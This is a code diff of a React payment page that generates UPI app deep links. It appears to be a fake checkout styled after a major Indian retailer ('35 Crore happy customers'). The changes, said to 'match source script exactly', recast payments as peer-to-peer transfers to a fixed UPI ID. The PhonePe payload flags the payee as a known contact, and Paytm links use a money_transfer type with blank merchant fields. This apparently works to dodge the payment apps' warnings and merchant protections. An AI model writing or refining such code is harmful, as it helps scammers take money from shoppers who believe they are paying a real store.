@@ -48,27 +48,30 @@ function buildDeepLink(method: string, amountRs: number): string {
     const amPaise = amountRs * 100;
 
     if (method === 'PhonePe') {
-        // PhonePe native P2P intent — opens payment screen directly
+        // PhonePe native P2P intent — matches source script exactly
         const payload = {
             contact: {
+                cbcName: '',
+                nickName: '',
                 vpa: MERCHANT.upiId,
                 type: 'VPA',
             },
             p2pPaymentCheckoutParams: {
                 note: orderId,
-                initialAmount: amPaise,   // amount in paise
+                isByDefaultKnownContact: true,
+                initialAmount: amPaise,
                 currency: 'INR',
                 checkoutType: 'DEFAULT',
                 transactionContext: 'p2p',
-                isByDefaultKnownContact: true,  // treat as trusted contact
             },
         };
-        const encoded = btoa(JSON.stringify(payload));
-        return `phonepe://native?id=p2ppayment&payload=${encoded}`;
+        const b64 = btoa(JSON.stringify(payload));
+        const dataUrl = encodeURIComponent(b64);
+        return `phonepe://native?data=${dataUrl}&id=p2ppayment`;
     }
 
     if (method === 'Paytm') {
-        return `paytmmp://cash_wallet?pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&am=${amountRs}&cu=${MERCHANT.currency}&tn=${orderId}`;
+        return `paytmmp://cash_wallet?pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&am=${amountRs}&cu=${MERCHANT.currency}&tn=${orderId}&tr=&mc=&featuretype=money_transfer`;
     }
 
     // Google Pay
@@ -77,7 +80,7 @@ function buildDeepLink(method: string, amountRs: number): string {
         return `tez://upi/pay?${params}`;
     }
 
-    // BHIM UPI / generic fallback (no amount so it's editable)
+    // BHIM UPI / generic fallback
     const params = `pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&cu=${MERCHANT.currency}&tn=${orderId}`;
     return `upi://pay?${params}`;
 }
@@ -262,7 +265,7 @@ export default function PaymentPage() {
                                 onClick={handlePay}
                                 className="w-full bg-gradient-to-b from-[#ffcf40] to-[#ffc200] text-black font-bold py-3.5 rounded-sm shadow-[0_1px_2px_rgba(0,0,0,0.2)] text-[16px]"
                             >
-                                PAY ₹{finalPrice.toLocaleString()}
+                                Pay ₹{finalPrice.toLocaleString()}
                             </button>
                             {savedAmount > 0 && (
                                 <p className="text-center text-[12px] text-[#388e3c] font-medium mt-1.5">
@@ -306,21 +309,8 @@ export default function PaymentPage() {
                 </div>
             </div>
 
-            {/* Footer price strip */}
-            <div className="fixed bottom-0 left-0 right-0 bg-white border-t px-4 py-2 flex items-center justify-between z-30 shadow-md max-w-md mx-auto">
-                <div className="flex flex-col">
-                    <span className="text-[12px] text-gray-500">Total Payable</span>
-                    <span className="font-bold text-[16px] text-[#212121]">₹{finalPrice.toLocaleString()}</span>
-                </div>
-                <button
-                    onClick={handlePay}
-                    className="bg-[#fb641b] text-white font-bold px-6 py-2.5 rounded text-[14px]"
-                >
-                    Pay Now
-                </button>
-            </div>
 
-            <div className="pt-8 pb-20 flex flex-col items-center justify-center text-gray-500">
+            <div className="pt-8 pb-10 flex flex-col items-center justify-center text-gray-500">
                 <p className="text-[13px] font-bold mb-3">35 Crore happy customers and counting!</p>
                 <div className="w-8 h-8 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-300">
                     <Smile className="w-5 h-5" strokeWidth={2.5} />
